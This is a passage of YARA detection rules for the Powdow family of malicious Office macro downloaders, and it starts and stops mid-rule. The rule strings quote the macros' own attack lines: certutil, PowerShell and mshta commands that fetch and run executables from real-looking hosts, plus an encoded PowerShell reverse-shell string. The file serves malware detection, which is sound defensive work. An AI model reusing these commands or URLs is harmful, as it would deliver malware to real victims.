        $x_1_2 = {44 65 62 75 67 2e 50 72 69 6e 74 20 4d 73 67 42 6f 78 28 22 45 52 52 4f 52 21 52 65 2d 49 6e 73 74 61 6c 6c 20 4f 66 66 69 63 65 22 2c 20 76 62 4f 4b 43 61 6e 63 65 6c 29 3b 20 72 65 74 75 72 6e 73 3b 20 31 02 00 6f 62 6a 2e 6c 6f 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RPA_2147810733_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RPA!MTB"
        threat_id = "2147810733"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 6f 6e 74 6f 73 6f 66 6f 72 72 65 73 74 65 72 64 65 6d 6f 2e 62 6c 6f 62 2e 63 6f 72 65 2e 77 69 6e 64 6f 77 73 2e 6e 65 74 2f 64 6f 63 73 2f 6c 6f 61 64 65 72 6f 75 74 6f 6e 65 6c 69 6e 65 72 2e 70 73 31 27 29 29 9f 00 64 6f 77 6e 6c 6f 61 64 73 74 72 69 6e 67 28 27 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "shell\"powershell-whidden-execbypassinvoke-expression((new-objectsystem.net.webclient)." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDJ_2147810762_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDJ!MTB"
        threat_id = "2147810762"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell Start-BitsTransfer -Source https://img.20mn.fr/r5SvxqSZSrWS4W587_eJxw/640x410_fond-ecran-defaut-windows-xp.jpg" ascii //weight: 1
        $x_1_2 = "-Destination C:\\Users\\Gisela\\Documents\\image.jpg" ascii //weight: 1
        $x_1_3 = "strOutput = RunCommand(strCommand" ascii //weight: 1
        $x_1_4 = "Set objNode = objXML.createElement(\"b64\")" ascii //weight: 1
        $x_1_5 = "RunCommand = \"ERROR\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAF_2147810924_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAF!MTB"
        threat_id = "2147810924"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://trietlongvinhvien.info//.tmb/ID4/4rodtz.exe\"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDK_2147810949_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDK!MTB"
        threat_id = "2147810949"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"https://cdn.discordapp.com/attachments/930138836154073182/933518961692246026/DirectX.exe\"\"" ascii //weight: 1
        $x_1_2 = "&& Qdlmmisxzshqjuz.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAG_2147810979_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAG!MTB"
        threat_id = "2147810979"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = {2e 4f 70 65 6e 20 22 67 65 74 22 2c 20 [0-100] 28 22 68 ?? ?? ?? ?? 3a 2f 2f 77 77 77 2e [0-100] 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = "AppData & Chr(Asc(xImifijfx) - 1)" ascii //weight: 1
        $x_1_4 = "Mid(enc, iOIJOjhihgugkhi, 1)" ascii //weight: 1
        $x_1_5 = "= WshShell.SpecialFolders(\"Recent\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAH_2147811227_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAH!MTB"
        threat_id = "2147811227"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell king.lol, vbHide" ascii //weight: 1
        $x_1_2 = "kind + \" http://www.j.mp/ahsdiahwidaiuwd\"" ascii //weight: 1
        $x_1_3 = "d + h + t + j + R" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAI_2147811240_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAI!MTB"
        threat_id = "2147811240"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell Environ(\"PUBLIC\") & \"\\calc.com\" + \"" ascii //weight: 1
        $x_1_2 = "www.j.mp/dadwawwdjdasodkwodkcbyw\", vbHide" ascii //weight: 1
        $x_1_3 = "fso = CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_4 = "fso.copyfile \"C:\\Windows\\System32\\mshta.exe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDL_2147811389_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDL!MTB"
        threat_id = "2147811389"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://doxiting.co.za/wp/wp-content/uploads/J.com\"" ascii //weight: 1
        $x_1_2 = "&& Gvoxwzh.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDO_2147811479_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDO!MTB"
        threat_id = "2147811479"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set FSO = GetObject(XOREncryption(" ascii //weight: 1
        $x_1_2 = "FSO.copyfile XOREncryption(" ascii //weight: 1
        $x_1_3 = "see = \"ajsdjawiduaiwduaiudiawu\"" ascii //weight: 1
        $x_1_4 = "Shell Environ(\"PUBLIC\") & \"\\calc.com\" + moka + see, vbHide" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAJ_2147811567_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAJ!MTB"
        threat_id = "2147811567"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = {2e 4f 70 65 6e 20 22 70 6f 73 74 22 2c 20 [0-100] 28 22 68 ?? ?? ?? ?? 3a 2f 2f 6a [0-100] 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = {49 6e 53 74 72 28 [0-100] 2c 20 4d 69 64 28 [0-100] 2c 20 69 2c 20 31 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
        $x_1_5 = "Range(\"A1\").Value = \"ok.......\"" ascii //weight: 1
        $x_1_6 = "= WshShell.SpecialFolders(\"Recent\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAK_2147811568_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAK!MTB"
        threat_id = "2147811568"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Int2Str(\"032104116116112058047047119119119046106046109112047\")" ascii //weight: 1
        $x_1_2 = "Environ(Int2Str(\"080085066076073067\")) & Int2Str(\"092112101101101046099111109\") + moka + see" ascii //weight: 1
        $x_1_3 = "GetObject(Int2Str(\"119105110109103109116115058\")).Get(Int2Str(\"087105110051050095080114111099101115115\")).Create" ascii //weight: 1
        $x_1_4 = "I = 1 To Len(sText) Step 3" ascii //weight: 1
        $x_1_5 = "sName = Mid(sText, I, 3)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDP_2147811577_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDP!MTB"
        threat_id = "2147811577"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 38 2e 31 35 36 2e 31 32 39 2e 36 33 2f 65 6e 74 69 74 79 2f [0-15] 2e 62 61 74 22 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDQ_2147811668_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDQ!MTB"
        threat_id = "2147811668"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 38 2e 31 35 36 2e 31 32 39 2e 36 33 2f 76 6c 6f 67 2f [0-32] 2e 62 61 74 22 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAL_2147811744_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAL!MTB"
        threat_id = "2147811744"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 56 42 41 2e 53 68 65 6c 6c 20 5f 0d 0a 28 70 69 6e 67 73 29}  //weight: 1, accuracy: High
        $x_1_2 = "KARTIC = \"://www.bitly.com/\"" ascii //weight: 1
        $x_1_3 = {4c 47 20 3d 20 22 [0-1] 68 74 74 70 73 22}  //weight: 1, accuracy: Low
        $x_1_4 = "T = TAec + TYing" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAL_2147811744_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAL!MTB"
        threat_id = "2147811744"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"powershell -e ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCcxOTIuMTY4LjQ5Ljc2Jyw4MDgyKTsgPSAuR2V0U3RyZWFtKCk7W2J5dGVbX" ascii //weight: 1
        $x_1_2 = "Shell Str, vbHide" ascii //weight: 1
        $x_1_3 = "sTime = DateDiff(\"s\", TI, TOUT)" ascii //weight: 1
        $x_1_4 = "Sleep (2000)" ascii //weight: 1
        $x_1_5 = {41 75 74 6f 4f 70 65 6e 28 29 0d 0a 20 20 20 20 46 6c 79 69 6e 67 4d 6f 6e 6b 65 79}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDR_2147811815_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDR!MTB"
        threat_id = "2147811815"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"https://joinmeapp.xyz/player.exe\"" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDT_2147811977_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDT!MTB"
        threat_id = "2147811977"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fso = CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_2 = "fso.copyfile \"C:\\Windows\\System32\\mshta.exe\", Environ(\"TEMP\") & \"\\calc.com\", True" ascii //weight: 1
        $x_1_3 = "Shell \"cmd /c cd %temp% && calc.com http://www.j.mp/dashkdhasudhwydhaucbyw && del calc.com\", vbHide" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAM_2147812180_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAM!MTB"
        threat_id = "2147812180"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://pastebin.com/raw/182EQMpi" ascii //weight: 1
        $x_1_2 = "CreateObject(\"WScript.Shell\").Run \"bFvBy.vbs\"" ascii //weight: 1
        $x_1_3 = "FtQDa.Open \"GET\", KZXnR, False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDU_2147812325_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDU!MTB"
        threat_id = "2147812325"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"https://cdn.discordapp.com/attachments/745163017951641640/940510201642106900/new_life_4.exe\"" ascii //weight: 1
        $x_1_2 = ".exe.exe && Mkwyoafqp.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDV_2147812326_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDV!MTB"
        threat_id = "2147812326"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 33 2e 31 31 32 2e 32 34 33 2e 32 38 2f [0-32] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDN_2147812336_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDN!MTB"
        threat_id = "2147812336"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "MsgBox \"Error Please Download file again\"" ascii //weight: 1
        $x_1_2 = {6f 62 6a 53 68 65 6c 6c 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 73 68 65 6c 6c 65 78 65 63 75 74 65 20 6c 75 6c 2e 6c 6f 6c 2c 20 22 68 74 74 70 3a 2f 2f 77 77 77 2e 6a 2e 6d 70 2f [0-47] 22 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "StrReverse(\"n\" + \"e\" + \"p\" + \"o\"), 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAN_2147812449_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAN!MTB"
        threat_id = "2147812449"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FBS.copyfile adoo, Environ$(jaluka) & \"\\lo\" + \"ve.co\" + String(1, \"m\"), True" ascii //weight: 1
        $x_1_2 = "Shell yeah" ascii //weight: 1
        $x_1_3 = "restinpeace = Join(cooper, \"\") + idcards + \"" ascii //weight: 1
        $x_1_4 = "kulili.TextBox1.Value + Space(2) + uu" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDW_2147812708_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDW!MTB"
        threat_id = "2147812708"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"https://cdn.discordapp.com/attachments/942041452245032984/942093222744821830/Confirmation_WayBill_Receipt.exe\"" ascii //weight: 1
        $x_1_2 = ".exe.exe && Xyyrtjypcsuhgurwpsrkmpko.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KAE_2147812848_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KAE!MTB"
        threat_id = "2147812848"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"h\" & \"t\" & \"t\" & \"p\" & \"s\" & \":\" & \"//uplooder.net/f/tl/4/d48d9ca52df058d7780be672496f3957/\" & \"1\" & \".\" & \"e\" & \"x\" & \"e\"" ascii //weight: 1
        $x_1_2 = "= Environ(\"public\") & \"\\pbc698\" & \".\" & \"e\" & \"x\" & \"e\"" ascii //weight: 1
        $x_1_3 = "CreateObject(\"\" & sasa & \"\").Run \"cmd /c ping -n 3 localhost & \" & Chr(34) & \"%public%\\pbc698\" & \".\" & \"e\" & \"x\" & \"e\" & Chr(34) & \"& ping -n 3 localhost & exit\", 0" ascii //weight: 1
        $x_1_4 = "= Replace(frmMain.ActiveForm.rtfText.SelText, vbTab, \"\", , 1)" ascii //weight: 1
        $x_1_5 = "= Dir(App.Path & \"\\PlugIns\\*.dll\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDY_2147812941_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDY!MTB"
        threat_id = "2147812941"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://keepwealt.co.za/reparations/COMPLETE.pif\"" ascii //weight: 1
        $x_1_2 = "Bgiotyid.exe.exe && Bgiotyid.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SFS_2147812991_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SFS!MTB"
        threat_id = "2147812991"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "POWERshEll.ExE wGet https://arturkarolczakshiola.com/zasa/fYiA22eXpUTT7uP.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SIS_2147813277_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SIS!MTB"
        threat_id = "2147813277"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Environ(\"TEMP\") & \"\\User.ex`e\"" ascii //weight: 1
        $x_1_2 = "= Replace(\"new:\" & CLng(6.7) & \"2Csoplan4D\", \"soplan\", \"2\")" ascii //weight: 1
        $x_1_3 = "= GetObject(akilodiszis & \"D5-D\" & CLng(6.8) & \"0A-438B-8A42-984\" & CLng(1.9) & \"4B8\" & CLng(7.8) & \"AFB\" & CInt(8.2))" ascii //weight: 1
        $x_1_4 = "lepatatefritte.exec \"cm\" & \"d /c powers^hell -w hi Start-BitsTransfer -Sou htt`ps://sh3238423.c.had.s`u/dajecura.j`pg -Dest \" &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAO_2147813484_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAO!MTB"
        threat_id = "2147813484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2d 77 20 68 69 [0-255] 20 2d 53 6f 75 72 63 20 68 74 74 60 70 [0-159] 2e 65 78 60 65 20 2d 44 65 73 74 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-159] 2e 65 60 78 65 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 02 2e 65 60 78 65}  //weight: 1, accuracy: Low
